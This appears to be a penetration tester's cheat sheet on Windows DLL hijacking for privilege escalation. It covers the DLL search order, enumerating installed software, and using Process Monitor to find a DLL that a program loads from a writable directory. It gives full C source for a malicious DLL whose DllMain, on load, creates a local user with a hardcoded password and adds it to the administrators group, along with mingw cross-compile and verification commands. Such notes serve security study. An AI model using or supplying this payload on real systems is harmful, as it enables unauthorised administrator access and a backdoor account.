DLL loading order:
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

Enumerate installed applications:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

- Check to see that the software directory is writeable
- Use Process Monitor to determine which .dll's are loaded, since **Process monitor must be run by an admin** the program in question must be installed on a computer that the attacker owns to run and analyze it
- Navigate to and execute C:\tools\Procmon\Procmon64.exe
- Apply filters so that only "CreateFile" operations from the process in question are displayed, apply a third filter to display only the .dll that is vulnerable

Create .dll precursor (TextShaping.cpp) to create new user and add them to admin group:
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Cross compile code with mingw:
- install mingw
```
sudo apt install mingw-w64
```
- cross compile
```
x86_64-w64-mingw32-gcc [NAME].cpp --shared -o [NAME].dll
```

Check to see if attack worked after someone with higher privs runs the process:
```
net user
```

```
net localgroup administrators
```
